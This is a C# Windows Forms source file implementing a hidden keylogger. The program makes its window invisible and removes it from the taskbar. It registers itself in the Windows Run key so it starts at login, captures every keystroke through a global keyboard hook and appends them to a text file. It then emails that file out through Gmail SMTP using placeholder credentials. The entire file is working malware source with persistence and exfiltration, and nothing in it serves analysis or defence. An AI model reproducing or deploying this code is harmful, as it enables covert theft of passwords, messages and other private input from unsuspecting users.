using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using Utilities;
using System.Linq;
using System.Threading.Tasks;

using System.IO;
using System.Net.Mail;
using Microsoft.Win32;
namespace key_preview {
    class globalKeyboardHook
    {
        #region Constant, Structure and Delegate Definitions
        public delegate int keyboardHookProc(int code, int wParam, ref keyboardHookStruct lParam);

        public struct keyboardHookStruct
        {
            public int vkCode;
            public int scanCode;
            public int flags;
            public int time;
            public int dwExtraInfo;
        }

        const int WH_KEYBOARD_LL = 13;
        const int WM_KEYDOWN = 0x100;
        const int WM_KEYUP = 0x101;
        const int WM_SYSKEYDOWN = 0x104;
        const int WM_SYSKEYUP = 0x105;
        private keyboardHookProc hookProcDelegate;
        #endregion

        #region Instance Variables
        public List<Keys> HookedKeys = new List<Keys>();
        IntPtr hhook = IntPtr.Zero;
        #endregion

        #region Events
        public event KeyEventHandler KeyDown;
        public event KeyEventHandler KeyUp;
        #endregion

        #region Constructors and Destructors
        public globalKeyboardHook()
        {
            hookProcDelegate = hookProc;
            hook();
        }

        ~globalKeyboardHook()
        {
            unhook();
        }
        #endregion

        #region Public Methods
        public void hook()
        {
            IntPtr hInstance = LoadLibrary("User32");
            hhook = SetWindowsHookEx(WH_KEYBOARD_LL, hookProcDelegate, hInstance, 0);
        }

        public void unhook()
        {
            UnhookWindowsHookEx(hhook);
        }

        public int hookProc(int code, int wParam, ref keyboardHookStruct lParam)
        {
            if (code >= 0)
            {
                Keys key = (Keys)lParam.vkCode;
                if (HookedKeys.Contains(key))
                {
                    KeyEventArgs kea = new KeyEventArgs(key);
                    if ((wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) && (KeyDown != null))
                    {
                        KeyDown(this, kea);
                    }
                    else if ((wParam == WM_KEYUP || wParam == WM_SYSKEYUP) && (KeyUp != null))
                    {
                        KeyUp(this, kea);
                    }
                    if (kea.Handled)
                        return 1;
                }
            }
            return CallNextHookEx(hhook, code, wParam, ref lParam);
        }
        #endregion

        #region DLL imports
        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, keyboardHookProc callback, IntPtr hInstance, uint threadId);

        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hInstance);

        [DllImport("user32.dll")]
        static extern int CallNextHookEx(IntPtr idHook, int nCode, int wParam, ref keyboardHookStruct lParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);
        #endregion
    }


    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            this.Opacity = 0;
            this.ShowInTaskbar = false;
            email_send();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            IsStartupItem();
            if (!IsStartupItem()) { rkApp.SetValue("Nome Applicazione", Application.ExecutablePath.ToString()); }

            globalKeyboardHook gkh = new globalKeyboardHook();
            gkh.HookedKeys.Add(Keys.A);
            gkh.HookedKeys.Add(Keys.B);
            gkh.HookedKeys.Add(Keys.C);
            gkh.HookedKeys.Add(Keys.D);
            gkh.HookedKeys.Add(Keys.E);
            gkh.HookedKeys.Add(Keys.F);
            gkh.HookedKeys.Add(Keys.G);
            gkh.HookedKeys.Add(Keys.H);
            gkh.HookedKeys.Add(Keys.I);
            gkh.HookedKeys.Add(Keys.J);
            gkh.HookedKeys.Add(Keys.K);
            gkh.HookedKeys.Add(Keys.L);
            gkh.HookedKeys.Add(Keys.M);
            gkh.HookedKeys.Add(Keys.N);
            gkh.HookedKeys.Add(Keys.O);
            gkh.HookedKeys.Add(Keys.P);
            gkh.HookedKeys.Add(Keys.Q);
            gkh.HookedKeys.Add(Keys.R);
            gkh.HookedKeys.Add(Keys.S);
            gkh.HookedKeys.Add(Keys.T);
            gkh.HookedKeys.Add(Keys.U);
            gkh.HookedKeys.Add(Keys.V);
            gkh.HookedKeys.Add(Keys.W);
            gkh.HookedKeys.Add(Keys.X);
            gkh.HookedKeys.Add(Keys.Y);
            gkh.HookedKeys.Add(Keys.Z);
            gkh.HookedKeys.Add(Keys.Back);
            gkh.HookedKeys.Add(Keys.Capital);
            gkh.HookedKeys.Add(Keys.CapsLock);
            gkh.HookedKeys.Add(Keys.Enter);
            gkh.HookedKeys.Add(Keys.Space);
            gkh.HookedKeys.Add(Keys.NumPad0);
            gkh.HookedKeys.Add(Keys.NumPad1);
            gkh.HookedKeys.Add(Keys.NumPad2);
            gkh.HookedKeys.Add(Keys.NumPad3);
            gkh.HookedKeys.Add(Keys.NumPad4);
            gkh.HookedKeys.Add(Keys.NumPad5);
            gkh.HookedKeys.Add(Keys.NumPad6);
            gkh.HookedKeys.Add(Keys.NumPad7);
            gkh.HookedKeys.Add(Keys.NumPad8);
            gkh.HookedKeys.Add(Keys.NumPad9);
            gkh.HookedKeys.Add(Keys.D0);
            gkh.HookedKeys.Add(Keys.D1);
            gkh.HookedKeys.Add(Keys.D2);
            gkh.HookedKeys.Add(Keys.D3);
            gkh.HookedKeys.Add(Keys.D4);
            gkh.HookedKeys.Add(Keys.D5);
            gkh.HookedKeys.Add(Keys.D6);
            gkh.HookedKeys.Add(Keys.D7);
            gkh.HookedKeys.Add(Keys.D8);
            gkh.HookedKeys.Add(Keys.D9);
            gkh.HookedKeys.Add(Keys.Delete);
            gkh.HookedKeys.Add(Keys.Oemcomma);
            gkh.HookedKeys.Add(Keys.Oem1);
            gkh.HookedKeys.Add(Keys.Oem102);
            gkh.HookedKeys.Add(Keys.Oem2);
            gkh.HookedKeys.Add(Keys.Oem3);
            gkh.HookedKeys.Add(Keys.Oem4);
            gkh.HookedKeys.Add(Keys.Oem5);
            gkh.HookedKeys.Add(Keys.Oem6);
            gkh.HookedKeys.Add(Keys.Oem7);
            gkh.HookedKeys.Add(Keys.Oem8);
            gkh.HookedKeys.Add(Keys.OemBackslash);
            gkh.HookedKeys.Add(Keys.OemClear);
            gkh.HookedKeys.Add(Keys.OemCloseBrackets);
            gkh.HookedKeys.Add(Keys.OemMinus);
            gkh.HookedKeys.Add(Keys.OemOpenBrackets);
            gkh.HookedKeys.Add(Keys.OemPeriod);
            gkh.HookedKeys.Add(Keys.OemPipe);
            gkh.HookedKeys.Add(Keys.Oemplus);
            gkh.HookedKeys.Add(Keys.OemQuestion);
            gkh.HookedKeys.Add(Keys.OemQuotes);
            gkh.HookedKeys.Add(Keys.OemSemicolon);
            gkh.HookedKeys.Add(Keys.Oemtilde);
            gkh.HookedKeys.Add(Keys.RShiftKey);
            gkh.HookedKeys.Add(Keys.LShiftKey);
            gkh.KeyDown += new KeyEventHandler(gkh_KeyDown);
        }

        void gkh_KeyDown(object sender, KeyEventArgs e)
        {
            string path = @"C:\Users\Root\Desktop\Results.txt";

            string content = e.KeyCode.ToString();
            if (content == "Return") { content = " <ENTER> "; }
            else if (content == "Back") { content = " <BACK> "; }
            else if (content == "Capital") { content = " <CAPS_LOCKS> "; }
            else if (content == "Delete") { content = " <DELETE> "; }
            else if (content == "Space") { content = " "; }
            else if (content == "D1") { content = "1"; }
            else if (content == "NumPad1") { content = "1"; }
            else if (content == "D2") { content = "2"; }
            else if (content == "NumPad2") { content = "2"; }
            else if (content == "D3") { content = "3"; }
            else if (content == "NumPad3") { content = "3"; }
            else if (content == "D4") { content = "4"; }
            else if (content == "NumPad4") { content = "4"; }
            else if (content == "D5") { content = "5"; }
            else if (content == "NumPad5") { content = "5"; }
            else if (content == "D6") { content = "6"; }
            else if (content == "NumPad6") { content = "6"; }
            else if (content == "D7") { content = "7"; }
            else if (content == "NumPad7") { content = "7"; }
            else if (content == "D8") { content = "8"; }
            else if (content == "NumPad8") { content = "8"; }
            else if (content == "D9") { content = "9"; }
            else if (content == "NumPad9") { content = "9"; }
            else if (content == "D0") { content = "0"; }
            else if (content == "NumPad0") { content = "0"; }
            else if (content == "Oemcomma") { content = ","; }
            else if (content == "Oem1") { content = "è"; }
            else if (content == "Oemtilde") { content = "ò"; }
            else if (content == "Oem7") { content = "à"; }
            else if (content == "OemQuestion") { content = "ù"; }
            else if (content == "Oem5") { content = "\\"; }
            else if (content == "OemBackSlash") { content = "<"; }
            else if (content == "Oem6") { content = "ì"; }
            else if (content == "OemOpenBrackets") { content = "'"; }
            else if (content == "Oemplus") { content = "+"; }
            else if (content == "OemPeriod") { content = "."; }
            else if (content == "OemMinus") { content = "-"; }
            else if (content == "LShiftKey") { content = " <Shift_SX> "; }
            else if (content == "RShiftKey") { content = " <Shift_DX> "; }
            File.AppendAllText(path, content);
        }

        private bool IsStartupItem()
        {
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            if (rkApp.GetValue("Nome Applicazione") == null)
                return false;
            else
                return true;
        }

        public void email_send()
        {
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
                SmtpServer.EnableSsl = true;
                mail.From = new MailAddress("Keyloggermail");
                mail.To.Add("send to thi mail@gmail.com");
                mail.Subject = "Subject";
                mail.Body = "KeyLogger ";
                System.Net.Mail.Attachment attachment;
                attachment = new System.Net.Mail.Attachment(@"C:\Users\Root\Desktop\Results.txt");
                mail.Attachments.Add(attachment);

                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential("keyloggermail", "keylogger mail password password");
                SmtpServer.EnableSsl = true;

                SmtpServer.Send(mail);

                attachment.Dispose();
                SmtpServer.Dispose();
            }
            catch (Exception ex) { }
        }
    }
}